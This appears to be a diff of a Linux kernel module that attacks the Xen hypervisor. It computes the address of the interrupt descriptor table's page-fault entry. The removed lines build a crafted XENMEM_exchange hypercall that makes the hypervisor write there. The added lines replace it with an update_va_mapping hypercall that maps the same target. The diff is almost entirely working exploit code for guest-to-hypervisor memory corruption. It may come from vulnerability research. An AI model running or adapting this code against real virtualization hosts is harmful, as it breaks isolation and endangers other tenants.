@@ -2,6 +2,7 @@
 #include <linux/kernel.h>
 #include <linux/types.h>
 #include <asm/xen/page.h>
+#include <asm/xen/hypercall.h> 
 
 unsigned long call_xen_memory_op(unsigned long op, void *argp);
 unsigned long call_xen_update_va_mapping(void *virt, unsigned long pte, unsigned long flags);
@@ -36,13 +37,15 @@ static void cleanup_test(void) {
   void *victim_page_virt;
   struct xen_memory_exchange args;
   unsigned long ret;
+  pte_t p;
+
   // hypervisor is lower than kernel, so hypervisor reference has to come first
   #define OUT_EXTENT_BASE_ADDR 0
 
   idt_addr = read_idt_addr();
   pr_warn("IDT at 0x%llx\n", idt_addr);
   target_addr = idt_addr + 16 * INTERRUPT_PAGEFAULT;
-  pr_warn("write target address: 0x%llx\n", target_addr);
+  pr_warn("Target address, (page fault handler): 0x%llx\n", target_addr);
   if ((target_addr & 0x7) != 0) {
     pr_warn("target_addr misaligned\n");
     return;
@@ -51,36 +54,10 @@ static void cleanup_test(void) {
   victim_page_virt = (void*)__get_free_pages(GFP_KERNEL, 0);
   in_extent = virt_to_mfn(victim_page_virt);
 
-  // We need to do this to make steal_page() in memory_exchange() work.
-  // Equivalent to xen_zap_pfn_range(victim_page_virt, 0, NULL, NULL).
-  call_xen_update_va_mapping(victim_page_virt, 0/*VOID_PTE*/, 0);
+  p.pte = target_addr;
 
-  nr_exchanged = (target_addr - OUT_EXTENT_BASE_ADDR) / 8;
-  nr_extents = nr_exchanged + 1;
-  in_extent_addr = (u64)&in_extent;
-  in_extent_base = in_extent_addr - (nr_exchanged * 8);
+  ret =   HYPERVISOR_faulty_update_va_mapping(victim_page_virt, p, UVMF_TLB_FLUSH);
 
-  args = (struct xen_memory_exchange){
-    .in = {
-      .extent_start = in_extent_base,
-      .nr_extents = nr_extents,
-      .domid = DOMID_SELF
-    },
-    .out = {
-      .extent_start = OUT_EXTENT_BASE_ADDR,
-      .nr_extents = nr_extents,
-      .domid = DOMID_SELF
-    },
-    .nr_exchanged = nr_exchanged
-  };
-
-  // In this case it will acess the addres encoded in :
-  //      exch.out.extent_start + 8 * exch.nr_exchanged
-  pr_warn("exch.out.extent_start:\t%x\n",OUT_EXTENT_BASE_ADDR);
-  pr_warn("exch.nr_exchanged:\t%llx\n",nr_exchanged);
-  pr_warn("Address to be accessed: :\t%llx\n", OUT_EXTENT_BASE_ADDR + 8 *nr_exchanged);
-  ret = call_xen_memory_op(XENMEM_exchange, &args);
-  pr_warn("hypercall returns %ld\n", ret);
 }
 
 module_init(init_test);
